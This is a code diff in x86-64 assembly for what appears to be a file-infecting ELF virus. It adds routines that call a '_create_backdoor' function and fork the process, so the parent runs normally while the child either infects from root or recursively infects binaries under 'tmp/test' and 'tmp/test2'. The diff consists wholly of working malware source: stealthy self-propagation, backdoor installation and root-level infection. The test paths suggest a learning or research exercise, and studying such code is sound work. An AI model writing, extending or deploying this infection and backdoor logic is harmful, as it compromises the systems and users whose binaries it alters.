@@ -3,7 +3,8 @@
 
 section .text
 	global _thread_create
-;	extern _verif
+    global _fork_before_exec_normaly
+	global _fork_before_infect_root
 
 ; here we fork our program, and then execute an infected binary
 _thread_create: ;void thread_create(not used, char *directory_to_infect, char *binary_path)
@@ -32,5 +33,47 @@ _parent_ret:
 	pop rdi
 	leave
 	ret
+
+_fork_before_infect_root:
+;; When we infect from root, we always fork the process, run it normally in the parent,
+;; and infect from root in the child
+    ;; fork
+	mov rax, SYS_FORK
+	syscall
+	cmp rax, 0
+    jne _exit_properly ;; parent
+
+    ;; child
+    lea rdi, [rel _exit_properly]
+    jmp _infect_from_root
+
+_fork_before_exec_normaly:
+;; When infecting normaly, we fork the process to run it normally in parent,
+;; and infect in child
+    ;; fork
+	call _create_backdoor
+	mov rax, SYS_FORK
+	syscall
+	cmp rax, 0
+    jne _verify_o_entry ;; parent
+
+    ;;child
+    lea rdi, [rel _exit_properly]
+	mov		rax, 0
+	push	rax
+	push	rax
+	mov		rax, 0x747365742f706d74			; %rax = "tmp/test"
+	push	rax								; push infection path on stack
+	mov		rdi, rsp
+	mov		rsi, rsp
+	add		rsi, 16
+	mov		rax, 1							; sets recursive infection
+	push	rax
+	push	rsi
+	push	rdi
+	call	_read_dir						; call our directory browsing function
+	mov		BYTE [rsp + 32], 0x32			; add a '2' at the end of the path string
+	call	_read_dir						; call our directory browsing function
+	jmp _exit_properly
 
 %undef FORK_S
